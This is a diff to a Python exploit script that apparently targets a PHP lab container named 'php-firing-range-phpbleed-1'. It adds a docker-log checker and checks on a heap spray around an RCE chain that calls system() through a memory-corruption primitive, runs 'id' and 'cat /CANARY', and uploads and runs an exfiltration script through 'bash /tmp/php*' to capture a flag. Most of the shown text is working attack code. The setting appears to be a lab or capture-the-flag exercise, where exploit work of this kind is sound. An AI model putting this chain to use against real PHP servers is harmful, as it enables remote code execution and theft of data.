@@ -36,6 +36,7 @@ import os
 import re
 import socket
 import struct
+import subprocess
 import sys
 import time
 from datetime import datetime, timezone
@@ -1195,6 +1196,23 @@ def _split_for_echo(content, staging='w'):
 FLAG_RE = re.compile(rb'FLAG\{[A-Za-z0-9_.:\-]+\}')
 
 
+CONTAINER = 'php-firing-range-phpbleed-1'
+
+
+def docker_logs_grep(pattern, since_s=20):
+    """Grep recent container logs (their channel: worker stdout = docker logs).
+    Returns matching lines (str) or ''."""
+    try:
+        out = subprocess.run(
+            ['docker', 'logs', f'--since', f'{since_s}s', CONTAINER],
+            capture_output=True, timeout=10)
+        txt = (out.stdout + out.stderr).decode('latin-1', 'replace')
+        lines = [ln for ln in txt.splitlines() if re.search(pattern, ln)]
+        return '\n'.join(lines)
+    except Exception as e:
+        return f'(docker logs failed: {e})'
+
+
 def trigger_rce(ce_stdclass, system_addr, spray_addr, cmd14, label=''):
     """R-7 single-shot: run one command (max 14 bytes after the GC byte).
     Returns (body, raw) or (None, None) on crash."""
@@ -1245,17 +1263,37 @@ def exfil_sequence(ce_stdclass, system_addr, spray_addr):
     """
     ev = {}
 
+    # S sanity: the spray slot must still hold our 280-byte string
+    global cur_tag
+    cur_tag = 'R-7 verify-S'
+    r = isstring_read(spray_addr - 0x18)
+    cur_tag = 'idle'
+    if r is None or r[0] != SPRAY_LEN:
+        fire_log(f"[R-7 verify-S] S-slot stale (read={r[0] if r else None}) - spray slot moved!")
+    else:
+        fire_log(f"[R-7 verify-S] S ok: len={r[0]}, head={r[1][:16].hex()}")
+        ev['S_verify_head'] = r[1][:32].hex()
+
     body, raw = trigger_rce(ce_stdclass, system_addr, spray_addr, b'id', label='id')
     ev['id_raw'] = (raw or b'')[:2000].decode('latin-1', 'replace')
+    dl = docker_logs_grep(r'uid=')
+    ev['id_docker_logs'] = dl
+    fire_log(f"[R-7 id] docker-logs uid= check: {dl[:120] if dl else '(none)'}")
 
     body, raw = trigger_rce(ce_stdclass, system_addr, spray_addr, b'cat /CANARY',
                             label='cat-canary')
     ev['cat_canary_raw'] = (raw or b'')[:2000].decode('latin-1', 'replace')
+    dl = docker_logs_grep(r'FLAG\{|CANARY')
+    ev['cat_canary_docker_logs'] = dl
+    fire_log(f"[R-7 cat-canary] docker-logs FLAG check: {dl[:120] if dl else '(none)'}")
 
     body, raw = fire_cmd_multipart(ce_stdclass, system_addr, spray_addr,
                                    b'bash /tmp/php*', EXFIL_SCRIPT,
                                    label='upload-exfil')
     ev['upload_exfil_raw'] = (raw or b'')[:4000].decode('latin-1', 'replace')
+    dl = docker_logs_grep(r'FLAG\{')
+    ev['upload_exfil_docker_logs'] = dl
+    fire_log(f"[R-7 upload-exfil] docker-logs FLAG check: {dl[:120] if dl else '(none)'}")
     if raw is not None:
         m = FLAG_RE.search(raw)
         if m:
